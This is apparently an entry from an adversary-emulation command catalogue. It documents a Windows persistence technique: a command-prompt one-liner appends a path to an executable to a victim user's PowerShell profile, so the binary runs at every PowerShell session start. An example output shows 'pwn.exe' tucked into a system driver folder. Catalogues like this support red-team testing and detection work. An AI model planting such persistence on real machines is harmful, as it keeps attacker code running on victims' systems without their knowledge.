---
id: d7b2a2ed-6c0c-4bc7-8993-5b16c2fbdcc4
name: Execute a Command when a PowerShell Session Starts
type: command
executor: command_prompt
data: echo "$_FULL_PATH\$_TARGET.exe" >> "C:\Users\$_TARGET_USER\Documents\WindowsPowerShell\profile.ps1"
output: C:\Users\Victim>echo C:\Windows\System32\spool\drivers\color\pwn.exe >> C:\Users\Victim\Documents\WindowsPowerShell\profile.ps1
created_at: '2020-06-22T03:58:55.070291+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Execute a Command when a PowerShell Session Starts

```command_prompt
echo "$_FULL_PATH\$_TARGET.exe" >> "C:\Users\$_TARGET_USER\Documents\WindowsPowerShell\profile.ps1"
```

## Expected Output

```
C:\Users\Victim>echo C:\Windows\System32\spool\drivers\color\pwn.exe >> C:\Users\Victim\Documents\WindowsPowerShell\profile.ps1
```


